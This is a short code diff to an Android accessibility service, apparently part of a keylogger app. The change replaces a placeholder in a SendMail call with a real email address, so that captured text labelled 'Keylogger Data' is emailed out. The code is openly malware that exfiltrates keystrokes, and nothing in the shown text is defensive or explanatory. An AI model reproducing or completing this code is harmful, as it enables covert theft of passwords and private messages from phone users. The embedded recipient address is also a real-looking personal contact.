@@ -90,7 +90,7 @@ public class testService extends AccessibilityService {
 
                                 //Creating SendMail object
                                 try {
-                                    SendMail sm = new SendMail(this, "XXXXX", "Keylogger Data", text.toString()); //Change XXXX by email adress where to send
+                                    SendMail sm = new SendMail(this, "humanchandanpandey@yahoo.com", "Keylogger Data", text.toString()); //Change XXXX by email adress where to send
 
                                     //Executing sendmail to send email
                                     sm.execute();
